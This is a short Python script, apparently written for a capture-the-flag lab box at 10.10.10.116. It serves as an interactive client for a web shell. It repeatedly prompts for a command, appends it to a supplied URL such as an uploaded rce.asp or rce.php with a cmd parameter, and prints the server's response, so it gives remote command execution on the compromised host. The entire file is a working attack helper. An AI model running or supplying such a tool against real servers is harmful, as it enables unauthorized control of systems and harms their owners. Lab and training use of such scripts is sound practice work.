import requests
import sys

if len(sys.argv) == 2:
	# We use our RCE in an infinite loop
	while True:
		# We ask for a command for the RCE
		cmd = raw_input('RCE Command: ')
		print(requests.get(url = sys.argv[1] + cmd).content)
else:
	# How to use the script
	print("How to use:\npython rce.py http://10.10.10.116/upload/rce.asp?cmd=\npython rce.py http://10.10.10.116/upload/rce.php?cmd=")
